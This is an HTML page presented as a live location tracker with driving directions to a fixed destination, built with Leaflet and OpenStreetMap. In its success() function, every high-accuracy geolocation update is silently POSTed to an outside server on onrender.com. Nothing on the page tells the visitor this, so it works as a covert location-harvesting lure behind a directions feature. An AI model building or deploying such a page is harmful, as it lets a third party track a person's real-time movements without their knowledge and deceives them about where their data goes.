<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>üìç Live Location Tracker with Directions</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- Leaflet CSS -->
  <link
    rel="stylesheet"
    href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
  />
  <link
    rel="stylesheet"
    href="https://unpkg.com/leaflet-routing-machine/dist/leaflet-routing-machine.css"
  />

  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      padding: 40px;
      background: #f0f4f8;
    }

    button {
      padding: 15px 30px;
      font-size: 18px;
      background: #007bff;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }

    button:hover {
      background: #0056b3;
    }

    #status {
      margin-top: 20px;
      font-size: 16px;
      color: #333;
    }

    #map {
      height: 400px;
      width: 100%;
      max-width: 600px;
      margin: 30px auto 0;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
  </style>
</head>

<body>
  <h2>üìç Live Location + Route Tracking</h2>
  <p>Click to start real-time location tracking and directions to a destination.</p>
  <button onclick="startTracking()">Start Tracking</button>
  <div id="status"></div>
  <div id="map"></div>

  <!-- Leaflet JS -->
  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
  <script src="https://unpkg.com/leaflet-routing-machine/dist/leaflet-routing-machine.min.js"></script>

  <script>
    let map, marker, routeControl;
    const destLat = 43.8500;
    const destLon = -79.6200; // üìç Destination ‚Äî you can change this

    function startTracking() {
      if (!navigator.geolocation) {
        updateStatus("‚ùå Geolocation not supported.");
        return;
      }

      updateStatus("üì° Starting live location tracking...");

      navigator.geolocation.watchPosition(success, error, {
        enableHighAccuracy: true,
        maximumAge: 0,
        timeout: 5000
      });
    }

    function success(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;

      updateStatus("üìç Updating location...");

      fetch("https://location-tracker-adow.onrender.com/location-handler", {
        method: "POST",
        mode: "cors",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ latitude: lat, longitude: lon })
      });

      updateMap(lat, lon);
      updateRoute(lat, lon);
    }

    function error() {
      updateStatus("‚ùå Unable to access your location.");
    }

    function updateStatus(msg) {
      document.getElementById("status").textContent = msg;
    }

    function updateMap(lat, lon) {
      if (!map) {
        map = L.map('map').setView([lat, lon], 14);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
          attribution: '&copy; OpenStreetMap contributors'
        }).addTo(map);

        marker = L.marker([lat, lon]).addTo(map).bindPopup("You are here üìç").openPopup();
      } else {
        marker.setLatLng([lat, lon]);
        map.panTo([lat, lon]);
      }
    }

    function updateRoute(lat, lon) {
      if (routeControl) {
        routeControl.setWaypoints([
          L.latLng(lat, lon),
          L.latLng(destLat, destLon)
        ]);
      } else {
        routeControl = L.Routing.control({
          waypoints: [
            L.latLng(lat, lon),
            L.latLng(destLat, destLon)
          ],
          routeWhileDragging: false,
          show: false,
          addWaypoints: false,
          createMarker: () => null
        }).addTo(map);
      }
    }
  </script>
</body>
</html>
